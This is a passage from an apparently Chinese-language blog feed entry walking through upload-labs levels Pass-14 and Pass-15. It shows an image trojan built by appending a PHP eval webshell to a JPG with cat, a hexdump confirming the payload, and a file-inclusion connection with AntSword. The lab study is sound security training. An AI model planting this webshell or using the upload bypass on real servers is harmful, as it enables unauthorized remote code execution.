+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-36-50.pfk0qon3i.webp&#34; alt=&#34;PixPin_2025-05-09_19-36-50&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传 &lt;code&gt;fish4.php&lt;/code&gt; 成功，利用任意文件包含漏洞使用蚁剑进行连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-38-01.86tv783uwl.webp&#34; alt=&#34;PixPin_2025-05-09_19-38-01&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Pass-14&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-14&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pass-14&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 失败，判断为 &lt;strong&gt;白名单&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp&#34; alt=&#34;PixPin_2025-05-09_17-10-29&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;尝试 &lt;strong&gt;上传图片马&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;将 &lt;code&gt;fish1.php&lt;/code&gt; 追加到 &lt;code&gt;fish_real.jpg&lt;/code&gt; 末尾，生成 &lt;code&gt;fish_trojan.jpg&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat fish_real.jpg fish1.php &amp;gt; fish_trojan.jpg&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;查看 &lt;code&gt;fish_trojan.jpg&lt;/code&gt; 最后 10 行的数据内容，确认一句话木马被正确追加&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;hailo㉿kali-Hailo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/workspace/upload-labs&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ hexdump -C fish_trojan.jpg &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tail
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0003b200  &lt;span class=&#34;m&#34;&gt;93&lt;/span&gt; f8 &lt;span class=&#34;m&#34;&gt;55&lt;/span&gt; c6 b7 8d &lt;span class=&#34;m&#34;&gt;49&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;60&lt;/span&gt;  b5 &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; c6 7a &lt;span class=&#34;m&#34;&gt;51&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;70&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; c3  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;..U...I&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;...zQp&lt;span class=&#34;s2&#34;&gt;&amp;#34;.|
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b210  7a d0 0b 8f 53 4e ef 4a  25 6c f4 14 5c 06 ac a7  |z...SN.J%l..\...|
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b220  71 06 9e 65 c8 c0 00 52  15 56 ed cd 21 8c 50 01  |q..e...R.V..!.P.|
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b230  b4 7f 7a 8d 87 d6 8c 6d  14 64 d2 18 bc fa d1 b8  |..z....m.d......|
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b240  f7 a3 39 a3 14 00 1e 7a  51 83 4a 06 28 ce 29 5c  |..9....zQ.J.(.)\|
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b250  60 29 43 1a 4a 29 0d 0b  b9 8f 1d 28 12 4c 9d 0e  |`)C.J).....(.L..|
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b260  7e b4 6e 34 e0 f4 0c ff  d9 3c 3f 70 68 70 20 40  |~.n4.....&amp;lt;?php @|
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b270  65 76 61 6c 28 24 5f 50  4f 53 54 5b 27 66 69 73  |eval(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[&amp;#39;fis|
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b280  68 27 5d 29 20 3f 3e                              |h&amp;#39;]) ?&amp;gt;|
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b287&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;上传 &lt;code&gt;fish_trojan.jpg&lt;/code&gt; 成功，利用任意文件包含漏洞使用蚁剑进行连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-07-54.5fksz6kkoc.webp&#34; alt=&#34;PixPin_2025-05-09_20-07-54&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Pass-15&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-15&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pass-15&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;div class=&#34;hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200&#34;&gt;
+  &lt;p class=&#34;hx-flex hx-items-center hx-font-medium&#34;&gt;&lt;svg height=16px class=&#34;hx-inline-block hx-align-middle hx-mr-2&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; fill=&#34;none&#34; viewBox=&#34;0 0 24 24&#34; stroke-width=&#34;2&#34; stroke=&#34;currentColor&#34; aria-hidden=&#34;true&#34;&gt;&lt;path stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34; d=&#34;M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;
+
+  &lt;div class=&#34;hx-w-full hx-min-w-0 hx-leading-7&#34;&gt;
+    &lt;div class=&#34;hx-mt-6 hx-leading-7 first:hx-mt-0&#34;&gt;&lt;p&gt;需要开启 php_exif 扩展模块&lt;/p&gt;&lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-12-54.2obqr45zsi.webp&#34; alt=&#34;PixPin_2025-05-09_20-12-54&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传 &lt;code&gt;fish_trojan.jpg&lt;/code&gt; 成功，利用任意文件包含漏洞使用蚁剑进行连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-19-03.7egzpj41lr.webp&#34; alt=&#34;PixPin_2025-05-09_20-19-03&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 
       </description>
     </item>
